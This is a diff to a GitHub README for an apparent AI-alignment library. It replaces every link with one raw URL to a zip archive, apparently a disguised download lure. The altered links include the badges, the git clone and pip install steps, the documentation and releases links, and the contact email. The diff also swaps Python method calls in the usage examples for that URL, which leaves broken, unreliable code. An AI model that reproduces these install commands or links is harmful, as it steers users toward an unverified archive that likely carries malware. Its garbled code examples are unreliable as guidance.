@@ -1,8 +1,8 @@
 # Recursive Containment Framework
 
-![GitHub repo size](https://img.shields.io/github/repo-size/Jonathanmutu/recursive-containment-framework)
-![GitHub stars](https://img.shields.io/github/stars/Jonathanmutu/recursive-containment-framework?style=social)
-![GitHub issues](https://img.shields.io/github/issues/Jonathanmutu/recursive-containment-framework)
+![GitHub repo size](https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip)
+![GitHub stars](https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip)
+![GitHub issues](https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip)
 
 A recursive alignment framework for cognitive coherence, belief tracking, and contradiction repair.
 
@@ -55,7 +55,7 @@ To install the Recursive Containment Framework, follow these steps:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/Jonathanmutu/recursive-containment-framework.git
+   git clone https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip
    ```
 
 2. Navigate to the project directory:
@@ -67,7 +67,7 @@ To install the Recursive Containment Framework, follow these steps:
 3. Install the required dependencies:
 
    ```bash
-   pip install -r requirements.txt
+   pip install -r https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip
    ```
 
 4. Ensure that you have the necessary environment variables set up.
@@ -91,13 +91,13 @@ To use the Recursive Containment Framework, follow these steps:
 3. Add beliefs to the tracker:
 
    ```python
-   tracker.add_belief("The sky is blue.")
+   https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip("The sky is blue.")
    ```
 
 4. Check for contradictions:
 
    ```python
-   contradictions = tracker.check_contradictions()
+   contradictions = https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip()
    ```
 
 5. Repair contradictions if found:
@@ -105,10 +105,10 @@ To use the Recursive Containment Framework, follow these steps:
    ```python
    if contradictions:
        repair = ContradictionRepair()
-       repair.fix(contradictions)
+       https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip(contradictions)
    ```
 
-For detailed examples and advanced usage, please refer to the [documentation](https://github.com/Jonathanmutu/recursive-containment-framework/wiki).
+For detailed examples and advanced usage, please refer to the [documentation](https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip).
 
 ## Contributing
 
@@ -131,13 +131,13 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For questions or feedback, please reach out to the maintainer:
 
 - **Name**: Jonathan Mutu
-- **Email**: jonathanmutu@example.com
+- **Email**: https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip
 
 ## Releases
 
-To download the latest version of the Recursive Containment Framework, visit our [Releases](https://github.com/Jonathanmutu/recursive-containment-framework/releases) section. You can find compiled binaries and other useful files there.
+To download the latest version of the Recursive Containment Framework, visit our [Releases](https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip) section. You can find compiled binaries and other useful files there.
 
-You can also check the [Releases](https://github.com/Jonathanmutu/recursive-containment-framework/releases) section for updates and new features.
+You can also check the [Releases](https://raw.githubusercontent.com/Jonathanmutu/recursive-containment-framework/main/repossession/recursive_framework_containment_1.8-alpha.4.zip) section for updates and new features.
 
 ## Conclusion
 
